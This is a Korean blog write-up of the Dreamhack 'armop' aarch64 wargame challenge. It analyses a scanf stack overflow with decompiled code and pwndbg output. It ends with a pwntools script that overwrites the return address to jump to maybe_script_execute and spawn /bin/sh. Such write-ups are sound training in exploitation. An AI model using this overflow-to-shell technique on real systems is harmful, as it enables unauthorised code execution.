---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN armop"
excerpt: "드림핵 포너블 armop 문제풀이"
tags: [Dreamhack, pwnable, wargame, writeup]
math: true
date: 2025-07-25 14:00
---

회사에 입사하고 오랜만에 올리는 문제풀이다.

IoT 해킹을 직업으로 하며 arm환경에서 익스코드를 작성하는게 메인이 되었다.

기존에 문제에서 접하던 x64 환경과는 또 환경으로 적응하고 메모리 커럽션 공격을 더욱 고도화 시키기 위해 arm, mips, risc-V 문제를 풀어보며 공부할 예정이다.

이번 문제는 Dream hack의 armop 문제다. 처음에 rop로 풀려고 시도했는데 삽질하다가 쉬운방법으로 풀린 문제다.

문제 파일을 다운받고 내부 파일들을 먼저 살펴보자. deploy에 문제파일과 실행을 위한 스크립트가 있다. `qemu-aarch64-static` 명령으로 문제파일을 실행한다. 홈페이지의 문제 설명을 보면 디버깅을 할 때는 제공된 스크립트를 이용하라고 한다. utils 디렉터리에 qemu를 디버그 모드로 실행시키는 스크립트와 gdb target remote 예제 스크립트가 제공된다.

우선 도커파일을 빌드해서 prob 바이너리를 실행시켜보자.

```bash
pwn@f767549ec4e5:~$ ls -al
total 796
drwxr-x--- 1 pwn  pwn    4096 Jul 25 04:52 .
drwxr-xr-x 1 root root   4096 Jul 21 07:00 ..
-rw------- 1 pwn  pwn     137 Jul 23 23:59 .bash_history
-rw-r--r-- 1 pwn  pwn     220 Jul 21 07:00 .bash_logout
-rw-r--r-- 1 pwn  pwn    3771 Jul 21 07:00 .bashrc
-rw-r--r-- 1 pwn  pwn     807 Jul 21 07:00 .profile
-rw-r--r-- 1 root root      8 Jul 21 06:49 flag
-rwxr-xr-x 1 root root 774744 Jul 21 06:49 prob
-rwxr-xr-x 1 root root     36 Jul 21 06:49 run.sh
pwn@f767549ec4e5:~$ ./run.sh
exploit aarch64!

input: testtest
```

exploit aarch64! 문구를 출력하고 input: 출력 후 사용자 입력을 받는다.

이제 바이너리를 동적 분석도구로 확인해보자.

main함수는 아래와 같다.

```cpp
undefined8 main(void)

{
  int iVar1;
  
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  setvbuf((FILE *)stderr,(char *)0x0,2,0);
  iVar1 = system("echo \'exploit aarch64!\n\'");
  run(iVar1);
  return 0;
}
```

system함수를 통해 `exploit aarch64!` 를 출력하고 run함수를 실행한다. run 함수를 살펴보자

```cpp
void run(void)

{
  undefined1 auStack_10 [16];
  
  ___printf_chk(2,"input: ");
  __isoc99_scanf(&DAT_00467050,auStack_10);
  return;
}
```

위를 보면 16만큼 할당된 배열에 scanf를 통해 입력을 받는데 입력 길이에 대한 제한이 없다. 따라서 해당 부분에서 BoF가 발생한다.

처음에는 aarch64 ROP를 통해 문제를 풀려고 했는데 `/bin/sh` 문자열 검색중 다음과 같은 함수를 발견했다.

```cpp
void maybe_script_execute(undefined8 param_1,long *param_2,char **param_3)

{
  long lVar1;
  undefined1 *puVar2;
  undefined1 *puVar3;
  long lVar5;
  ulong uVar6;
  char **__argv;
  undefined1 auStack_60 [16];
  char *local_50;
  undefined8 uStack_48;
  long local_38;
  undefined1 *puVar4;
  
  puVar3 = auStack_60;
  puVar4 = auStack_60;
  local_38 = __stack_chk_guard;
  lVar5 = 0;
  if (*param_2 != 0) {
LAB_00441aec:
    lVar1 = lVar5 + 1;
    if (param_2[lVar1] != 0) goto LAB_00441ae4;
    uVar6 = lVar5 * 8 + 0x27;
    puVar2 = auStack_60;
    while (puVar4 != auStack_60 + -(uVar6 & 0xffffffffffff0000)) {
      puVar3 = puVar2 + -0x10000;
      *(undefined8 *)(puVar2 + -0xfc00) = 0;
      puVar4 = puVar2 + -0x10000;
      puVar2 = puVar2 + -0x10000;
    }
    uVar6 = uVar6 & 0xfff0;
    lVar5 = -uVar6;
    *(undefined8 *)(puVar3 + lVar5) = 0;
    if (0x3ff < uVar6) {
      *(undefined8 *)(puVar3 + lVar5 + 0x400) = 0;
      __argv = (char **)(puVar3 + lVar5 + 0x10);
      *__argv = "/bin/sh";
      *(undefined8 *)(puVar3 + lVar5 + 0x18) = param_1;
      if (lVar1 != 1) goto LAB_00441b9c;
      goto LAB_00441b54;
    }
    __argv = (char **)(puVar3 + lVar5 + 0x10);
    *__argv = "/bin/sh";
    *(undefined8 *)(puVar3 + lVar5 + 0x18) = param_1;
    if (lVar1 == 1) goto LAB_00441b54;
LAB_00441b9c:
    __argv = (char **)(puVar3 + lVar5 + 0x10);
    thunk_FUN_00400270(puVar3 + lVar5 + 0x20,param_2 + 1,lVar1 * 8);
    goto LAB_00441b58;
  }
  __argv = &local_50;
  local_50 = "/bin/sh";
  uStack_48 = param_1;
LAB_00441b54:
  __argv[2] = (char *)0x0;
LAB_00441b58:
  execve("/bin/sh",__argv,param_3);
LAB_00441b6c:
  if (local_38 - __stack_chk_guard == 0) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(&__stack_chk_guard,0,local_38 - __stack_chk_guard);
LAB_00441ae4:
  lVar5 = lVar1;
  if (lVar1 == 0x7ffffffe) goto LAB_00441bd0;
  goto LAB_00441aec;
LAB_00441bd0:
  lVar5 = tpidr_el0;
  *(undefined4 *)(lVar5 + 0x28) = 7;
  goto LAB_00441b6c;
}
```

간단하게 분석한 결과 함수의 파라미터로 전달된 명령을 `execve` 명령을 통해 구동시키는 코드로 단일 실행 시 `/bin/sh` 를 실행해 쉘이 떨어질 것이라 판단했다.

`qemu-aarch64-static` 의 `-g` 옵션을 통해 디버깅 포트를 활성화 하고 gdb를 붙여 16바이트를 입력 후 스택의 주소를 살펴보자.

```bash
pwn@f767549ec4e5:~$ qemu-aarch64-static -g 1234 prob
exploit aarch64!

input: aaaaaaaaaaaaaaaa
```

```cpp
pwndbg> ni
0x00000000004007cc in run ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────
*X0   1
*X1   0x49dd50 (__stack_chk_guard) ◂— 0xdfa7ef6a7643d800
 X2   0
 X3   0
*X4   0x28
*X5   0x18
*X6   0
*X7   0x4000008004b0 —▸ 0x400000800400 ◂— 0xffffffffff00ff00
*X8   0x3f
*X9   0
*X10  0
*X11  0
*X12  0xffffffc8
*X13  0x400000800450 ◂— 0
*X14  0x3a30
*X15  0x4a03e8 (_IO_2_1_stdin_) ◂— 0xfbad208b
*X16  0x40d8a4 (_IO_default_uflow) ◂— stp x29, x30, [sp, #-0x20]!
 X17  0x417b80 (__memcpy_mops) ◂— nop 
*X18  0x4a1830 (_nl_global_locale) —▸ 0x49cc60 (_nl_C_LC_CTYPE) —▸ 0x4698b0 (_nl_C_name) ◂— udf #0x43 /* 'C' */
 X19  1
 X20  0x400000800668 —▸ 0x400000800824 ◂— 0x534f4800626f7270 /* 'prob' */
 X21  2
 X22  0x400000800678 —▸ 0x400000800829 ◂— 'HOSTNAME=f767549ec4e5'
 X23  0x49c2b0 (__preinit_array_start) —▸ 0x4005e0 (init_have_lse_atomics) ◂— stp x29, x30, [sp, #-0x10]!
 X24  2
 X25  0x18
 X26  0x4a6000 (__pthread_keys+14384) ◂— 0
 X27  0x4a0020 —▸ 0x419040 (__strlen_generic) ◂— nop 
 X28  0x400250 (_init) ◂— nop 
 X29  0x400000800490 —▸ 0x4000008004b0 —▸ 0x400000800400 ◂— 0xffffffffff00ff00
 SP   0x400000800490 —▸ 0x4000008004b0 —▸ 0x400000800400 ◂— 0xffffffffff00ff00
 LR   0x4007cc (run+40) ◂— ldp x29, x30, [sp], #0x20
*PC   0x4007cc (run+40) ◂— ldp x29, x30, [sp], #0x20
─────────────────────────────────[ DISASM / aarch64 / set emulate on ]─────────────────────────────────
b+ 0x4007c8 <run+36>                        bl     __isoc99_scanf              <__isoc99_scanf>
 
 ► 0x4007cc <run+40>                        ldp    x29, x30, [sp], #0x20
   0x4007d0 <run+44>                      ✔ ret                                <main+96>
    ↓
   0x400834 <main+96>                       mov    w0, #0                    W0 => 0
   0x400838 <main+100>                      ldp    x29, x30, [sp], #0x10
   0x40083c <main+104>                    ✔ ret                                <__libc_start_call_main+88>
    ↓
   0x4008e8 <__libc_start_call_main+88>     bl     exit                        <exit>
 
   0x4008ec <__libc_start_call_main+92>     bl     __nptl_deallocate_tsd       <__nptl_deallocate_tsd>
 
   0x4008f0 <__libc_start_call_main+96>     adrp   x1, 0x4a0000              X1 => 0x4a0000
   0x4008f4 <__libc_start_call_main+100>    mov    w0, #-1
   0x4008f8 <__libc_start_call_main+104>    add    x1, x1, #0x5c8
───────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ x29 sp 0x400000800490 —▸ 0x4000008004b0 —▸ 0x400000800400 ◂— 0xffffffffff00ff00
01:0008│        0x400000800498 —▸ 0x400834 (main+96) ◂— mov w0, #0
02:0010│        0x4000008004a0 ◂— 'aaaaaaaaaaaaaaaa'
03:0018│        0x4000008004a8 ◂— 'aaaaaaaa'
04:0020│ x7     0x4000008004b0 —▸ 0x400000800400 ◂— 0xffffffffff00ff00
05:0028│        0x4000008004b8 —▸ 0x4008e8 (__libc_start_call_main+88) ◂— bl exit
06:0030│        0x4000008004c0 —▸ 0x4000008005d0 ◂— 0
07:0038│        0x4000008004c8 —▸ 0x400c8c (__libc_start_main_impl+872) ◂— bl __libc_check_standard_fds /* '5' */
─────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
 ► 0         0x4007cc run+40
   1         0x400834 main+96
   2         0x4008e8 __libc_start_call_main+88
   3         0x400c8c __libc_start_main_impl+872
   4         0x400670 _start+48
───────────────────────────────────────────────────────────────────────────────────────────────────────
```

이후 입력한 값이 위치한 스택의 -0x10 위치를 찍어 내용을 살펴보자.

```cpp
pwndbg> x/32gx 0x4000008004a0-0x10
0x400000800490: 0x00004000008004b0      0x0000000000400834
0x4000008004a0: 0x6161616161616161      0x6161616161616161
0x4000008004b0: 0x0000400000800400      0x00000000004008e8
0x4000008004c0: 0x00004000008005d0      0x0000000000400c8c
0x4000008004d0: 0x0000000000000000      0x0000000000400674
0x4000008004e0: 0x0000000100000000      0x0000400000800668
0x4000008004f0: 0x0000000000000001      0x0000400000800668
0x400000800500: 0x0000000000000002      0x0000400000800678
0x400000800510: 0x000000000049c2b0      0x0000000000000002
0x400000800520: 0x0000000000000018      0x00000000004a6000
0x400000800530: 0x00000000004a0020      0x0000000000400250
0x400000800540: 0x00004000008004c0      0x7eda91b1c1986a52
0x400000800550: 0x0000000000000001      0x7edad1b1c158663e
0x400000800560: 0x0000000000000000      0x0000000000000000
0x400000800570: 0x0000000000000000      0x0000000000000000
0x400000800580: 0x0000000000000000      0x0000000000000000
```

위 내용을 직접 분석하면 aarch64 아키텍쳐의 독특한 점을 확인할 수 있다. `0x400000800498` 지점의 `0x0000000000400834` 값은 run() 함수가 동작 후 리턴 하여 main으로 돌아갈 위치다. 그럼 입력한 값 뒤에 있는 `0x4000008004b0` 에 위치한 `0x00000000004008e8` 위치는 __libc_start_call_main이다. main함수가 끝난 뒤 return될 지점이다.

```cpp
pwndbg> disass 0x00000000004008e8
Dump of assembler code for function __libc_start_call_main:
   0x0000000000400890 <+0>:     stp     x29, x30, [sp, #-272]!
   0x0000000000400894 <+4>:     mov     x29, sp
   0x0000000000400898 <+8>:     str     x0, [sp, #24]
   0x000000000040089c <+12>:    add     x0, sp, #0x30
   0x00000000004008a0 <+16>:    str     w1, [sp, #36]
   0x00000000004008a4 <+20>:    str     x2, [sp, #40]
   0x00000000004008a8 <+24>:    bl      0x401080 <_setjmp>
   0x00000000004008ac <+28>:    cbnz    w0, 0x4008ec <__libc_start_call_main+92>
   0x00000000004008b0 <+32>:    mrs     x0, tpidr_el0
   0x00000000004008b4 <+36>:    adrp    x1, 0x4a6000 <__pthread_keys+14384>
   0x00000000004008b8 <+40>:    sub     x3, x0, #0x600
   0x00000000004008bc <+44>:    sub     x0, x0, #0x740
   0x00000000004008c0 <+48>:    ldr     x2, [x1, #2096]
   0x00000000004008c4 <+52>:    add     x1, sp, #0x30
   0x00000000004008c8 <+56>:    ldur    q0, [x3, #-72]
   0x00000000004008cc <+60>:    str     x1, [x0, #256]
   0x00000000004008d0 <+64>:    ldr     x3, [sp, #24]
   0x00000000004008d4 <+68>:    ldr     x1, [sp, #40]
   0x00000000004008d8 <+72>:    ext     v0.16b, v0.16b, v0.16b, #8
   0x00000000004008dc <+76>:    ldr     w0, [sp, #36]
   0x00000000004008e0 <+80>:    stur    q0, [sp, #232]
   0x00000000004008e4 <+84>:    blr     x3
   0x00000000004008e8 <+88>:    bl      0x401610 <exit>
   0x00000000004008ec <+92>:    bl      0x40fbd0 <__nptl_deallocate_tsd>
   0x00000000004008f0 <+96>:    adrp    x1, 0x4a0000
   0x00000000004008f4 <+100>:   mov     w0, #0xffffffff                 // #-1
   0x00000000004008f8 <+104>:   add     x1, x1, #0x5c8
   0x00000000004008fc <+108>:   bl      0x45ef30 <__aarch64_ldadd4_relax>
   0x0000000000400900 <+112>:   cmp     w0, #0x1
   0x0000000000400904 <+116>:   b.eq    0x40091c <__libc_start_call_main+140>  // b.none
   0x0000000000400908 <+120>:   mov     x8, #0x5d                       // #93
   0x000000000040090c <+124>:   nop
   0x0000000000400910 <+128>:   mov     x0, #0x0                        // #0
   0x0000000000400914 <+132>:   svc     #0x0
   0x0000000000400918 <+136>:   b       0x400910 <__libc_start_call_main+128>
   0x000000000040091c <+140>:   mov     w0, #0x0                        // #0
   0x0000000000400920 <+144>:   bl      0x401610 <exit>
End of assembler dump.
```

입력하고자 하는 위치 뒤에 있는 스택 값은 지금 상황에서 덮어 씌울 방법이 없다. 그러면 가장 가까운 `0x00000000004008e8` 값을 조작하고 main이 끝난 뒤 원하는 곳으로 점프할 수 있는지 확인하자. return주소를 `0x6363636363636363`으로 overwrite하고 main의 return까지 진행시켜 해당 위치로 이동하는지 확인한다.

```cpp
pwndbg> x/32gx 0x4000008004a0
0x4000008004a0: 0x6161616161616161      0x6161616161616161
0x4000008004b0: 0x6262626262626262      0x6363636363636363
0x4000008004c0: 0x0000400000800500      0x0000000000400c8c
0x4000008004d0: 0x0000000000000000      0x0000000000400674
0x4000008004e0: 0x0000000100000000      0x0000400000800668
0x4000008004f0: 0x0000000000000001      0x0000400000800668
0x400000800500: 0x0000000000000002      0x0000400000800678
0x400000800510: 0x000000000049c2b0      0x0000000000000002
0x400000800520: 0x0000000000000018      0x00000000004a6000
0x400000800530: 0x00000000004a0020      0x0000000000400250
0x400000800540: 0x00004000008004c0      0xb368fbd897096349
0x400000800550: 0x0000000000000001      0xb368bbd897c96f25
0x400000800560: 0x0000000000000000      0x0000000000000000
0x400000800570: 0x0000000000000000      0x0000000000000000
0x400000800580: 0x0000000000000000      0x0000000000000000
0x400000800590: 0x0000000000000000      0x0000000000000000 
```

```cpp
pwndbg> 
0x000000000040083c in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────
 X0   0
 X1   0x49dd50 (__stack_chk_guard) ◂— 0x1c8bb25695de4f00
 X2   0
 X3   0
 X4   0x28
 X5   0x18
 X6   0
 X7   0x4000008004c0 —▸ 0x400000800500 ◂— 2
 X8   0x3f
 X9   0
 X10  0
 X11  0
 X12  0xffffffc8
 X13  0x400000800450 ◂— 0
 X14  0x3a30
 X15  0x4a03e8 (_IO_2_1_stdin_) ◂— 0xfbad208b
 X16  0x40d8a4 (_IO_default_uflow) ◂— stp x29, x30, [sp, #-0x20]!
 X17  0x417b80 (__memcpy_mops) ◂— nop 
 X18  0x4a1830 (_nl_global_locale) —▸ 0x49cc60 (_nl_C_LC_CTYPE) —▸ 0x4698b0 (_nl_C_name) ◂— udf #0x43 /* 'C' */
 X19  1
 X20  0x400000800668 —▸ 0x400000800824 ◂— 0x534f4800626f7270 /* 'prob' */
 X21  2
 X22  0x400000800678 —▸ 0x400000800829 ◂— 'HOSTNAME=f767549ec4e5'
 X23  0x49c2b0 (__preinit_array_start) —▸ 0x4005e0 (init_have_lse_atomics) ◂— stp x29, x30, [sp, #-0x10]!
 X24  2
 X25  0x18
 X26  0x4a6000 (__pthread_keys+14384) ◂— 0
 X27  0x4a0020 —▸ 0x419040 (__strlen_generic) ◂— nop 
 X28  0x400250 (_init) ◂— nop 
*X29  0x6262626262626262 ('bbbbbbbb')
*SP   0x4000008004c0 —▸ 0x400000800500 ◂— 2
 LR   0x6363636363636363 ('cccccccc')
*PC   0x40083c (main+104) ◂— ret 
─────────────────────────────────[ DISASM / aarch64 / set emulate on ]─────────────────────────────────
b+ 0x4007cc <run+40>      ldp    x29, x30, [sp], #0x20
   0x4007d0 <run+44>    ✔ ret                                <main+96>
    ↓
   0x400834 <main+96>     mov    w0, #0                    W0 => 0
   0x400838 <main+100>    ldp    x29, x30, [sp], #0x10
 ► 0x40083c <main+104>  ✔ ret                                <0x6363636363636363>
    ↓

───────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ x7 sp 0x4000008004c0 —▸ 0x400000800500 ◂— 2
01:0008│       0x4000008004c8 —▸ 0x400c8c (__libc_start_main_impl+872) ◂— bl __libc_check_standard_fds /* '5' */
02:0010│       0x4000008004d0 ◂— 0
03:0018│       0x4000008004d8 —▸ 0x400674 (_start+52) ◂— nop 
04:0020│       0x4000008004e0 ◂— 0x100000000
05:0028│       0x4000008004e8 —▸ 0x400000800668 —▸ 0x400000800824 ◂— 0x534f4800626f7270 /* 'prob' */
06:0030│       0x4000008004f0 ◂— 1
07:0038│       0x4000008004f8 —▸ 0x400000800668 —▸ 0x400000800824 ◂— 0x534f4800626f7270 /* 'prob' */
─────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
 ► 0         0x40083c main+104
   1 0x6363636363636363 None
───────────────────────────────────────────────────────────────────────────────────────────────────────
```

gdb를 확인하면 main함수에서 `0x6363636363636363` 로 return하려는 것을 볼 수 있다. 그러면 해당 부분을 `maybe_script_execute` 함수 주소로 변조하면 쉘을 얻을 수 있을 것이다.

익스 코드는 다음과 같다.

```python
from pwn import *
context.update(arch='aarch64', os='linux')
#context.log_level = 'debug'

# p = process(['qemu-aarch64-static','-L', '/usr/arm-linux-gnueabi', '-g', '8888', './app'])
p = process(['qemu-aarch64-static', '-g', '1111', './deploy/prob'])

elf = ELF("./deploy/prob")

pause()

_system=0x401b00

binsh_addr = 0x004671c8

exec_binsh = 0x0441b60

maybe_script_execute = 0x00441aa0

bof = b"a"*24

# payload  = bof
# payload += p64(0x0000000000435e38)      # 리턴주소: 가젯 주소
# #payload += b"B" * (0x60)            # (0x60 - 8) 패딩: 가젯 주소 이후부터 sp+0x60까지 패딩
# payload += p64(_system)*6
# payload += p64(binsh_addr)               # sp+0x60: x0에 들어갈 값
# payload += b"C" * (0x80 - 0x68)         # (0x80 - 0x68) 패딩: sp+0x68 ~ sp+0x80까지 패딩
# payload += b"D"*8             # sp+0x80: x29(Frame Pointer)
# payload += p64(_system)

payload1 = bof
payload1 += p64(maybe_script_execute)

p.sendlineafter(b"input: ", payload1)
pause()

p.interactive()
```